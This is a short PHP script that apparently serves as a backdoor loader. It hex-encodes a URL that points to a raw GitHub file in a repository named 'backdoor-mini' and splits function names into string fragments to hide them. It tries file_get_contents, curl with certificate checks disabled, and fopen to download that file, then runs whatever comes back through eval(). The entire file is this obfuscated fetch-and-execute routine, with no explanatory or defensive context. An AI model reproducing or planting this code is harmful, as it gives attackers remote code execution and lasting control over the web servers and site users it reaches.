<?php
$hexUrl = '68747470733A2F2F7261772E67697468756275736572636F6E74656E742E636F6D2F47616E657374536576656E2F6261636B646F6F722D6D696E692F726566732F68656164732F6D61696E2F6865782E706870';

function hex2str($hex) {
    $str = '';
    for ($i = 0; $i < strlen($hex) - 1; $i += 2) {
        $str .= chr(hexdec($hex[$i] . $hex[$i + 1]));
    }
    return $str;
}

$url = hex2str($hexUrl);

function downloadWithFileGetContents($url) {
    if (ini_get('a' . 'llow' . '_ur' . 'l_fo' . 'pe' . 'n')) {
        return file_get_contents($url);
    }
    return false;
}

function downloadWithCurl($url) {
    if (function_exists('c' . 'u' . 'rl' . '_i' . 'n' . 'i' . 't')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        $data = curl_exec($ch);
        curl_close($ch);
        return $data;
    }
    return false;
}

function downloadWithFopen($url) {
    $result = false;
    if ($fp = fopen($url, 'r')) {
        $result = '';
        while ($data = fread($fp, 8192)) {
            $result .= $data;
        }
        fclose($fp);
    }
    return $result;
}

$phpScript = downloadWithFileGetContents($url);
if ($phpScript === false) {
    $phpScript = downloadWithCurl($url);
}
if ($phpScript === false) {
    $phpScript = downloadWithFopen($url);
}

if ($phpScript === false) {
    die("Gagal mendownload script PHP dari URL dengan semua metode.");
}

eval('?>' . $phpScript);
?>
